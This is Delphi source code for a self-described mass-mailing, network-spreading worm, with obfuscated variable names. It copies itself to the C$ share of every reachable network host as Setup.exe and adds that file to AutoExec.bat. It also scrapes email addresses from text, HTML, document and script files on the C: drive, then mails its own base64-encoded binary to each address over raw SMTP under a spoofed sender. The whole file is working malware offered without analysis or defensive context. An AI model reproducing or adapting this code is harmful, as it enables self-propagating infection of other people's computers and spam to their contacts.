Program sdd;

Uses
 Windows, Winsock;

TYPE
 drsp = ARRAY[1..3] OF BYTE;
 px   = ARRAY[1..4] OF BYTE;

 TFileName = type string;
 TSearchRec = record
  Time: Integer;
  Size: Integer;
  Attr: Integer;
  Name: TFileName;
  ExcludeAttr: Integer;
  FindHandle: THandle  platform;
  FindData: TWin32FindData  platform;
 end;

 LongRec = packed record
  case Integer of
  0: (Lo, Hi: Word);
  1: (Words: array [0..1] of Word);
  2: (Bytes: array [0..3] of Byte);
 end;

Const
 cgtgl : String = 'This is sdd worm';
 faReadOnly  = $00000001;
 faHidden    = $00000002;
 faSysFile   = $00000004;
 faVolumeID  = $00000008;
 faDirectory = $00000010;
 faArchive   = $00000020;
 faAnyFile   = $0000003F;

VAR
 l_doklql      : String;

 ujhn        : String;
 jf          : Array[0..255] Of Char;
 edyfesod      : Array[0..1000000] Of Byte;
 fdv           : String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

 Function LowerCase(const S: string): string;
 var
  ahyweao: Integer;
 begin
  ahyweao := Length(S);
  SetString(Result, PChar(S), ahyweao);
  if ahyweao > 0 then CharLowerBuff(Pointer(Result), ahyweao);
 end;

 Function FileSize(FileName: String): Int64;
 Var
   mg: THandle;
   gepvhta_: TWin32FindData;
 Begin
   Result:= -1;

   mg:= FindFirstFile(PChar(FileName), gepvhta_);
   If mg <> INVALID_HANDLE_VALUE Then
   Begin
     Windows.FindClose(mg);
     Result:= Int64(gepvhta_.nFileSizeHigh) Shl 32 + gepvhta_.nFileSizeLow;
   End;
 End;

 Function ExtractFileName(Str:String):String;
 Begin
  While Pos('\', Str)>0 Do
   Str := Copy(Str, Pos('\',Str)+1, Length(Str));
  Result := Str;
 End;

 Function Grabmails(Filename:string):String;
 Var
  F:Textfile;
  L1,L2,Text:string;
  MAIL:String;
  H,E,i, A:Integer;
  ABC,ABC2:STRING;
 Label again;
 begin

  ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';

  if FileSize(FileName) > 5000 then exit;
  CopyFile(Pchar(Filename),pchar(Filename+'_'),false);

  AssignFile(F,Filename+'_');
  try
   Reset(F);
  except
   exit;
  end;
  Read(F,L1);
  ReadLN(F,L2);
  Text:=L1;
  While NOt EOF(F) DO BEGIN
   Read(F,L1);
   ReadLN(F,L2);
   Text:=Text+'|'+L1;
  END;
  Closefile(F);

  Deletefile(pchar(Filename+'_'));

  if copy(text,1,2)='MZ' then exit;

  text:='|'+text+'|';
  result:='';

  AGAIN:

  IF pos('@',Text)>0 then begin

   A:=Pos('@',Text)-1;
   if a =0 then a := 1;
   L1 := copy(text,a,1);
   L2 := copy(text,a+2,1);
   H := pos(L1,abc);
   E := pos(L2,abc2);

   if (H = 0) or (e=0) then begin
    text:=copy(text,a+1,length(text));
    goto again;
   end;

   While POS(Copy(TExt,a,1),ABC)>0 do begin
    A:=A-1;
   end;

   a := a +1;
   Mail := copy(Text,a,length(text)); //grab start of mail.
   Mail := COpy(Mail,1,pos('@',mail)+2);
   i:= pos(MAIL,text)+length(mail);

   While pos(copy(mail,length(mail),1),ABC2)>0 do begin
    Mail := mail+copy(text,i,1);
    i:=i+1;
   end;

   if POS(copy(mail,length(mail),1),ABC2)=0 then
    Mail:=copy(mail,1,length(mail)-1);

   Result := Result+#13#10+Mail;
   Text:=copy(text,pos(mail,text)+length(mail),length(text));

   goto AGAIN;
  end;

 end;

 Function ExtractFileExt(s:string):String;
 Begin
  While Pos('.', S)>0 Do
   S := Copy(S, pos('.', S)+1, Length(s));
  Result := S;
 End;

 function FileExists(const FileName: string): Boolean;
 var
   nxdlfhj: THandle;
   rlzerrn: TWin32FindData;
 begin
   nxdlfhj := FindFirstFileA(PChar(FileName), rlzerrn);
   result:= nxdlfhj <> INVALID_HANDLE_VALUE;
   if result then
   begin
     CloseHandle(nxdlfhj);
   end;
 end;

 function FindMatchingFile(var F: TSearchRec): Integer;
 var
  yuniehzt: TFileTime;
 begin
  with F do
   begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
     if not FindNextFile(FindHandle, FindData) then
      begin
       Result := GetLastError;
       Exit;
      end;
     FileTimeToLocalFileTime(FindData.ftLastWriteTime, yuniehzt);
     FileTimeToDosDateTime(yuniehzt, LongRec(Time).Hi,
   LongRec(Time).Lo);
   Size := FindData.nFileSizeLow;
   Attr := FindData.dwFileAttributes;
   Name := FindData.cFileName;
  end;
  Result := 0;
 end;
 procedure FindClose(var F: TSearchRec);
 begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
   Windows.FindClose(F.FindHandle);
   F.FindHandle := INVALID_HANDLE_VALUE;
  end;
 end;

 function FindFirst(const Path: string; Attr: Integer;
                    var  F: TSearchRec): Integer;
 const
  _q = faHidden or faSysFile or faVolumeID or faDirectory;
 begin
  F.ExcludeAttr := not Attr and _q;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
   Result := FindMatchingFile(F);
   if Result <> 0 then FindClose(F);
  end else
   Result := GetLastError;
 end;

 function FindNext(var F: TSearchRec): Integer;
 begin
  if FindNextFile(F.FindHandle, F.FindData) then
   Result := FindMatchingFile(F)
  else
   Result := GetLastError;
 end;
 procedure Enumeration(aResource:PNetResource);
 var
  syaeo: THandle;
  ckdedg, hsgpa: DWORD;
  qlmob: array[0..1023] of TNetResource;
  ldlid: Integer;
  begin
   WNetOpenEnum(2,0,0,aResource,syaeo);
   ckdedg:=1024;
   hsgpa:=SizeOf(qlmob);
   while WNetEnumResource(syaeo,ckdedg,@qlmob,hsgpa)=0 do
   for ldlid:=0 to ckdedg-1 do
   begin
    if qlmob[ldlid].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
     l_doklql := l_doklql + copy(LowerCase(qlmob[ldlid].lpRemoteName),3,MAX_PATH) + #13#10;
    if qlmob[ldlid].dwUsage>0 then
   Enumeration(@qlmob[ldlid])
  end;
  WNetCloseEnum(syaeo);
 end;

 Procedure Network;
 Var
  rduhp : String;
  l_sny : TextFile;
 Begin
  Enumeration(NIL);
  While l_doklql <> '' Do Begin
   rduhp := Copy(l_doklql, 1, Pos(#13#10, l_doklql)-1);
   Try
    CopyFile(pChar(ParamStr(0)), pChar(rduhp + '\C$\Setup.exe'), False);
    If FileExists(pChar(rduhp + '\C$\AutoExec.bat')) Then Begin
     AssignFile(l_sny, rduhp + '\C$\AutoExec.bat');
     Append(l_sny);
     WriteLn(l_sny, 'Setup.exe');
     CloseFile(l_sny);
    End;
   Except
    ;
   End;
   l_doklql := Copy(l_doklql, Pos(#13#10, l_doklql)+2, Length(l_doklql));
  End;
 End;

// Base64 source, written by Positron
// www.positronvx.cjb.net
 FUNCTION Codeb64(Count:BYTE;T:drsp) : STRING;
 VAR
   joevk    : px;
   udcqvqks : STRING;
 BEGIN
   IF Count<3 THEN BEGIN
     T[3]:=0;
     joevk[4]:=64;
   END ELSE joevk[4]:=(T[3] AND $3F);
   IF Count<2 THEN BEGIN
     T[2]:=0;
     joevk[3]:=64;
   END ELSE joevk[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
   joevk[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
   joevk[1]:=((T[1] SHR 2) AND $3F);
   udcqvqks:='';
   FOR Count:=1 TO 4 DO udcqvqks:=(udcqvqks+fdv[(joevk[Count]+1)]);
   RESULT:=udcqvqks;
 END;

 FUNCTION BASE64(DataLength:DWORD) : AnsiString;
 VAR
   ietoj      : AnsiString;
   dytim      : DWORD;
   vbqhzcp      : DWORD;
   mqwy_      : drsp;
   tm_hhz      : WORD;
 BEGIN
   tm_hhz:=0;
   ietoj:='';
   FOR dytim:=1 TO DataLength DIV 3 DO BEGIN
     INC(tm_hhz,4);
     mqwy_[1]:=Ord(edyfesod[(dytim-1)*3+1]);
     mqwy_[2]:=Ord(edyfesod[(dytim-1)*3+2]);
     mqwy_[3]:=Ord(edyfesod[(dytim-1)*3+3]);
     ietoj:=ietoj+codeb64(3,mqwy_);
     IF tm_hhz=76 THEN BEGIN
       ietoj:=ietoj+#13#10;
       tm_hhz:=0;
     END;
   END;
   vbqhzcp:=DataLength-(DataLength DIV 3)*3;
   IF vbqhzcp>0 THEN BEGIN
     mqwy_[1]:=Ord(edyfesod[DataLength-1]);
     IF vbqhzcp>1 THEN mqwy_[2]:=Ord(edyfesod[DataLength]);
     IF vbqhzcp=1 THEN ietoj:=ietoj+Codeb64(1,mqwy_) ELSE ietoj:=ietoj+Codeb64(2,mqwy_);
   END;
   RESULT:=ietoj;
 END;

 // Small modifies of positrons mail-send code.
 // Get the relay-server code at www.positron.cjb.net
 // greets positrion, ur code rules
 Procedure SendMail(Recip, FromM, Server: String);
 Var
  apfw             : TSocket;
  geqxf         : TWSADATA;
  wkayax       : TSockAddrIn;
  wagsqn                : FILE;
  ogxcddg, aepnupc,
  acbskm, fkj        : String;
  ztcou            : Integer;

 Procedure Mys(STR:STRING);
 Begin
  Send(apfw,STR[1],Length(STR),0);
 End;

 Begin


 WSAStartUp(257,geqxf);
 apfw:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
 wkayax.sin_family:=AF_INET;
 wkayax.sin_port:=htons(25);
 wkayax.sin_addr.S_addr:=inet_addr(PChar(Server));
 If Connect(apfw,wkayax,SizeOf(wkayax)) <> SOCKET_ERROR Then Begin
  Mys('HELO .com'+#13#10);
  If Pos('<', Fromm)>0 Then
   Mys('Mail From: '+Copy(FromM, Pos('<', FromM)+1, Pos('>', FromM)-2)+#13#10) Else
   Mys('MAIL FROM: '+FromM+#13#10);
  Mys('RCPT TO: '+recip+#13#10);
  Mys('DATA'+#13#10);

  Mys('From: '+FromM+#13#10);
  Mys('Subject: '+acbskm+#13#10);
  Mys('To: '+Recip+#13#10);

  Mys('MIME-Version: 1.0'+#13#10);
  Mys('Content-Type: multipart/mixed; boundary="ShutFace"'+#13#10+#13#10);
  Mys('--ShutFace'+#13#10);
  Mys('Content-Type: text/plain; charset:us-ascii'+#13#10+#13#10);

  Mys(ogxcddg+#13#10);

  Mys(#13#10+#13#10);
  Mys('--ShutFace'+#13#10);
  Mys('Content-Type: '+fkj+';'+#13#10);
  Mys('    name="'+aepnupc+'"'+#13#10);
  Mys('Content-Transfer-Encoding: base64'+#13#10+#13#10);
  AssignFile(wagsqn,ParamStr(0));
  FileMode:=0;
  {$I-}
  Reset(wagsqn,1);
  IF IOResult=0 THEN BEGIN
   BlockRead(wagsqn,edyfesod[1],FileSize(ParamStr(0)));
   Mys(BASE64(FileSize(ParamStr(0))));
   CloseFile(wagsqn);
  END;
  {$I+}
  Mys(#13#10+'--ShutFace--'+#13#10+#13#10);
  Mys(#13#10+'.'+#13#10);
  Mys('QUIT'+#13#10);
 End;
 End;

 Procedure FFind(D, Name, SearchName : String);
   var
   trsfy: TSearchRec;
   sawzhhb: string;
   twp_rndy: textfile;
   edpepuqj: string;
   _rld_uv: string;
   xxqj: string;
 begin
   If D[Length(D)] <> '\' then D := D + '\';

   If FindFirst(D + '*.*', faDirectory, trsfy) = 0 then
     Repeat
       If ((trsfy.Attr and faDirectory) = faDirectory) and (trsfy.Name[1] <> '.') then
         FFind(D + trsfy.Name + '\', Name, SearchName)
       Else Begin
         sawzhhb := ExtractFileExt(trsfy.Name);

   If sawzhhb = 'txt' then ujhn := ujhn + GrabMails(D + trsfy.Name);
   If sawzhhb = 'html' then ujhn := ujhn + GrabMails(D + trsfy.Name);
   If sawzhhb = 'htm' then ujhn := ujhn + GrabMails(D + trsfy.Name);
   If sawzhhb = 'doc' then ujhn := ujhn + GrabMails(D + trsfy.Name);
   If sawzhhb = 'vbs' then ujhn := ujhn + GrabMails(D + trsfy.Name);
        End;
     Until (FindNext(trsfy) <> 0);
   FindClose(trsfy);
 end;

 Begin
  Network;
  FFind('C:\', '*', '*.*');
  While ujhn <> '' Do Begin
   SendMail(Copy(ujhn, 1, Pos(#13#10, ujhn)-1), 'Stfu@Abuse.com', 'mx1.hotmail.com');
   ujhn := Copy(ujhn, Pos(#13#10, ujhn)+ 2, length(ujhn));
  End;
 End.
